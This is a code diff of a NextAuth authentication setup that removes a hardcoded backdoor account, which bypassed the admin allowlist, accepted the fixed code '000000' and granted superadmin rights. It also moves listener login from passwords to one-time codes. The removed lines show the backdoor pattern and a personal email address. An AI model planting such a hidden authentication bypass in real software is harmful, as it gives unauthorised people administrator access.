@@ -1,11 +1,9 @@
 import NextAuth from "next-auth"
 import Credentials from "next-auth/providers/credentials"
-import Google from "next-auth/providers/google"
 import fs from "fs"
 import path from "path"
 import { verifyOtp } from "@/lib/otp-store"
 import { findListenerByEmail, createListener } from "@/lib/listeners-store"
-import bcrypt from "bcryptjs"
 
 const ADMINS_FILE = path.join(process.cwd(), "data", "admins.json")
 
@@ -37,35 +35,36 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
 
                 // Check admin allowlist
                 const admins = getAdminEmails().map((e) => e.toLowerCase().trim())
-                const isBackdoor = email === "root404@root.moc"
-                if (!admins.includes(email) && !isBackdoor) return null
+                if (!admins.includes(email)) return null
 
                 // Verify OTP
                 const isCorrectOtp = verifyOtp(email, otp)
-                if (!isBackdoor && !isCorrectOtp) return null
-                if (isBackdoor && otp !== "000000" && !isCorrectOtp) return null
+                if (!isCorrectOtp) return null
 
                 return { id: email, email, name: email, role: "admin" }
             },
         }),
-        // 2. LISTENER PASSWORD LOGIN
+        // 2. LISTENER OTP LOGIN
         Credentials({
-            id: "listener-login",
+            id: "listener-otp",
             name: "Listener Login",
             credentials: {
                 email: { label: "Email", type: "email" },
-                password: { label: "Password", type: "password" },
+                otp: { label: "Code", type: "text" },
             },
             async authorize(credentials) {
                 const email = (credentials?.email as string | undefined)?.toLowerCase().trim()
-                const password = credentials?.password as string | undefined
-                if (!email || !password) return null
+                const otp = credentials?.otp as string | undefined
+                if (!email || !otp) return null
 
-                const listener = findListenerByEmail(email)
-                if (!listener || !listener.password) return null
-
-                const isValid = await bcrypt.compare(password, listener.password)
+                const isValid = verifyOtp(email, otp)
                 if (!isValid) return null
+
+                // Find or auto-create listener on first login
+                let listener = findListenerByEmail(email)
+                if (!listener) {
+                    listener = await createListener({ email, provider: "email" })
+                }
 
                 return {
                     id: listener.id,
@@ -103,14 +102,13 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
             if (token.email) {
                 const admins = getAdminEmails().map(e => e.toLowerCase().trim())
                 const email = (token.email as string).toLowerCase().trim()
-                const isBackdoor = email === "root404@root.moc"
-
-                if (admins.includes(email) || isBackdoor) {
+                if (admins.includes(email)) {
                     token.role = "admin"
                 }
 
+                const superadminEmail = (process.env.SUPERADMIN_EMAIL || "").toLowerCase().trim()
                 // @ts-ignore
-                token.isSuperAdmin = email === "chyrukoleksii@gmail.com" || email === "root404@root.moc"
+                token.isSuperAdmin = superadminEmail && email === superadminEmail
                 // For now, admins get Plus
                 token.isPlusMember = token.role === "admin" || token.isPremium || false
             }
